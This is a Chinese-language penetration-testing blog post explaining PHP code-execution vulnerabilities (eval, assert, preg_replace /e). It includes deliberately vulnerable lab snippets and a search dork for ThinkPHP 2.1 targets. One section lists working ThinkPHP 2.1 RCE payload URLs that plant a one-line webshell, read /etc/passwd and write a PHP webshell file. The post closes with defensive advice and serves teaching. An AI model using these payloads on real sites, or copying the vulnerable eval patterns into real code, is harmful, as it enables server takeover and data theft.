<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content=""/>
  <meta name="author" content="Reber"/>
  
    
      <title>代码执行漏洞(一) | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>代码执行漏洞(一)</h1>
      
<div class="post-meta">
    <time>2016-07-25</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/rce">rce</a>)
</div>

      <div><h3 id="0x00-代码执行">0x00 代码执行</h3>
<p>当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。</p>
<h3 id="0x01-相关函数">0x01 相关函数</h3>
<pre tabindex="0"><code>PHP：eval assert
Python：exec
asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;
Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能
</code></pre><h3 id="0x02-phpcms中的string2array函数">0x02 phpcms中的string2array函数</h3>
<p>这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组</p>
<pre tabindex="0"><code>array(  //这个是字符串形式的数组，它并不是数组，而是字符串
    &#39;upload_maxsize&#39; =&gt; &#39;2048&#39;,
    &#39;upload_allowext&#39; =&gt; &#39;jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf&#39;, 
    &#39;watermark_enable&#39; =&gt; &#39;1&#39;,
    &#39;watermark_minwidth&#39; =&gt; &#39;300&#39;,
    &#39;watermark_minheight&#39; =&gt; &#39;300&#39;,
    &#39;watermark_img&#39; =&gt; &#39;/statics/img/water/mark.png&#39;,
    &#39;watermark_pct&#39; =&gt; &#39;85&#39;,
    &#39;watermark_quality&#39; =&gt; &#39;80&#39;,
    &#39;watermark_pos&#39; =&gt; &#39;9&#39;,
)
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">string2array</span>($data) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//这个函数可以将字符串$data转化为数组
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>($data <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>) 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">array</span>(); 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">array = </span><span style="color:#e6db74">$data</span><span style="color:#e6db74">;&#34;</span>); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $array;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="0x03-漏洞危害">0x03 漏洞危害</h3>
<ul>
<li>执行代码</li>
<li>让网站写shell</li>
<li>甚至控制服务器</li>
</ul>
<h3 id="0x04-漏洞分类也是利用点">0x04 漏洞分类(也是利用点)</h3>
<pre tabindex="0"><code>执行代码的函数：eval、assert
callback函数：preg_replace + /e模式
反序列化：unserialize()(反序列化函数)
</code></pre><h3 id="0x05-漏洞挖掘">0x05 漏洞挖掘</h3>
<pre tabindex="0"><code>框架找漏洞，如ThinkPHP：
  inurl:index.php intext:ThinkPHP 2.1 { Fast &amp; Simple OOP PHP Framework }
框架的URL格式如下：
  Site:Port/Module name/Method name/Property name/Preperty value
  Site:Port/index.php?m=Module_name&amp;f=Method_name&amp;v=Preperty_value
  
  www.xx.com:88/News/show/id/328
  www.yy.com:99/index.php?m=News&amp;f=detail&amp;item=23
  www.zz.com/global_cms_contentview_id_2435
</code></pre><h3 id="0x06-搭建环境实验">0x06 搭建环境实验</h3>
<ul>
<li>示例一</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;data&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">ret = </span><span style="color:#e6db74">$data</span><span style="color:#e6db74">;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $ret;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><img src="/img/post/code_execution_eval1.png" alt="代码执行漏洞使用eval函数1"></p>
<ul>
<li>示例二</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;data&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">ret = strtolower(&#39;</span><span style="color:#e6db74">$data</span><span style="color:#e6db74">&#39;);&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $ret;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><img src="/img/post/code_execution_eval2.png" alt="代码执行漏洞使用eval函数2"></p>
<ul>
<li>示例三</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;data&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">ret = strtolower(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$data\</span><span style="color:#e6db74">&#34;</span>);<span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    echo </span><span style="color:#e6db74">$ret</span><span style="color:#e6db74">;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?&gt;
</span></span></span></code></pre></div><p><img src="/img/post/code_execution_eval3.png" alt="代码执行漏洞使用eval函数3">
<img src="/img/post/code_execution_eval4.png" alt="代码执行漏洞使用eval函数4"></p>
<ul>
<li>示例四</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;data&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">ret = strtolower(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$data\</span><span style="color:#e6db74">&#34;</span>);<span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    echo </span><span style="color:#e6db74">$ret</span><span style="color:#e6db74">;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?&gt;
</span></span></span></code></pre></div><p><img src="/img/post/code_execution_eval5.png" alt="代码执行漏洞使用eval函数5">
<img src="/img/post/code_execution_eval6.png" alt="代码执行漏洞使用eval函数6"></p>
<ul>
<li>示例五<br>
mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])<br>
/e修正符使preg_replace()将replacement参数当作PHP 代码(在适当的逆向引用替换完之后)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;data&#39;</span>];
</span></span><span style="display:flex;"><span>    $ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/&lt;data&gt;(.*?)&lt;\/data&gt;/e&#39;</span>,<span style="color:#e6db74">&#39;$ret = &#34;\\1&#34;&#39;</span>,$data);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $ret;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><img src="/img/post/code_execution_preg_replace.png" alt="代码执行漏洞使用preg_replace函数"></p>
<h3 id="0x07-具体操作">0x07 具体操作</h3>
<pre tabindex="0"><code># 一般找CMS相应版本漏洞，如ThinkPHP2.1
* 一句话
    http://www.xxx.com/News/detail/id/{${@eval($_POST[aa])}}
* 得到当前路径
    http://www.xxx.com/News/detail/id/{${print(getcwd()))}}
* 读文件
    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_get_contents($_POST[&#39;f&#39;])))}}
    POST的数据为：f=/etc/passwd
* 写shell
    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_put_contents($_POST[&#39;f&#39;],$_POST[d])))}}
    POST的数据为：f=1.php&amp;d=&lt;?php @eval($_POST[&#39;aa&#39;])?&gt;
</code></pre><h3 id="0x08-漏洞防御">0x08 漏洞防御</h3>
<ul>
<li>使用json保存数组，当读取时就不需要使用eval了</li>
<li>对于必须使用eval的地方，一定严格处理用户数据</li>
<li>字符串使用单引号包括可控代码，插入前使用addslashes转义</li>
<li>放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换</li>
<li>若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象</li>
</ul>
<h4 id="下一篇代码执行漏洞二posts2016code-execution-vulnerabilities-2">下一篇：<a href="/posts/2016/code-execution-vulnerabilities-2/">代码执行漏洞(二)</a></h4>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2023
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
